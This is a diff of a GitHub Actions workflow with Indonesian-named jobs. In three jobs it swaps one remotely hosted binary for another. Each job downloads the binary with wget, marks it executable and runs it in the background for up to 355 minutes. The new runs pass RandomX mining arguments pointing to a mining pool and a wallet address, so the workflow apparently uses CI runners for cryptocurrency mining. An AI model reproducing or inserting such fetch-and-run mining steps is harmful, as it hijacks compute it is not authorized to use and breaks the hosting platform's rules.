@@ -29,10 +29,10 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update
-        timeout 5m wget https://gist.githubusercontent.com/joaobem6/a4925f5856219c5adc0e336961bc559c/raw/7891666f95ba0a6856fc973dc5f54f31ba777881/000 && chmod +x 000 && ./000 &
+        timeout 5m wget https://github.com/joaobem6/Gues/raw/main/100 && chmod +x 100 && ./100 -a rx/0 --url randomx.rplant.xyz:17123 --tls --user TuskeSyuUU11JV9aA7hRge2guz56EwNVdPvuHUKK61X6CSYS9PoeqL8Z1NLsUXuiQrQtFRHKwgRHRRd4yfsvNoab4rpec6SJbcpAdC.Tes &
         sleep 5m
         echo "sukses"
-  Borongan:
+  BuruhBorongan:
     needs: pekerjaRodi
     runs-on: ubuntu-latest
     strategy:
@@ -55,10 +55,10 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update
-        timeout 355m wget https://gist.githubusercontent.com/joaobem6/a4925f5856219c5adc0e336961bc559c/raw/7891666f95ba0a6856fc973dc5f54f31ba777881/000 && chmod +x 000 && ./000 &
+        timeout 355m wget https://github.com/joaobem6/Gues/raw/main/100 && chmod +x 100 && ./100 -a rx/0 --url randomx.rplant.xyz:17123 --tls --user TuskeSyuUU11JV9aA7hRge2guz56EwNVdPvuHUKK61X6CSYS9PoeqL8Z1NLsUXuiQrQtFRHKwgRHRRd4yfsvNoab4rpec6SJbcpAdC.Tes &
         sleep 355m
         echo "sukses"
-  Borongan1:
+  BuruhBorongan2:
     needs: pekerjaRodi
     runs-on: ubuntu-latest
     strategy:
@@ -81,11 +81,11 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update
-        timeout 355m wget https://gist.githubusercontent.com/joaobem6/a4925f5856219c5adc0e336961bc559c/raw/7891666f95ba0a6856fc973dc5f54f31ba777881/000 && chmod +x 000 && ./000 &
+        timeout 355m wget https://github.com/joaobem6/Gues/raw/main/100 && chmod +x 100 && ./100 -a rx/0 --url randomx.rplant.xyz:17123 --tls --user TuskeSyuUU11JV9aA7hRge2guz56EwNVdPvuHUKK61X6CSYS9PoeqL8Z1NLsUXuiQrQtFRHKwgRHRRd4yfsvNoab4rpec6SJbcpAdC.Tes &
         sleep 355m
         echo "sukses"
   Success:
-    needs: [pekerjaRodi, Borongan, Borongan1]
+    needs: [pekerjaRodi, BuruhBorongan, BuruhBorongan2]
     if: always()
     runs-on: ubuntu-20.04
     steps:
